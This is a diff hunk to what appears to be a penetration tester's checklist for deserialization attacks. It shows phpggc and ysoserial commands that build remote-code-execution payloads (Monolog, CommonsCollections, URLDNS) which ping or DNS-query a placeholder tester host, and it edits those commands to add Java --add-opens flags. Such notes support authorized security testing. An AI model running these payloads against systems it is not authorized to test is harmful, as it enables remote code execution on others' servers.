@@ -44,9 +44,9 @@ phpggc -pj dummy.jpg -o avatar.phar.jpg monolog/rce1 system 'ping -c 2 <LHOST>'
 wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar
 - [ ] Chains match the libraries on the classpath: error messages, WEB-INF/lib, framework versions
 URLDNS needs no library at all. With THE-DNS-NAME a name whose lookups I can see, such as from interactsh:
-java -jar ysoserial-all.jar URLDNS 'http://THE-DNS-NAME/' | base64 -w 0
-java -jar ysoserial-all.jar CommonsCollections6 'ping -c 2 <LHOST>' | base64 -w 0
-java -jar ysoserial-all.jar CommonsCollections5 'ping -c 2 <LHOST>' | base64 -w 0
+java --add-opens=java.base/java.net=ALL-UNNAMED -jar ysoserial-all.jar URLDNS 'http://THE-DNS-NAME/' | base64 -w 0
+java --add-opens=java.base/java.util=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections6 'ping -c 2 <LHOST>' | base64 -w 0
+java --add-opens=java.management/javax.management=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections5 'ping -c 2 <LHOST>' | base64 -w 0
 - [ ] Runtime.exec() takes no pipes or redirects: the shell goes in as the bash -c {echo,...} line above
 
 ## .NET
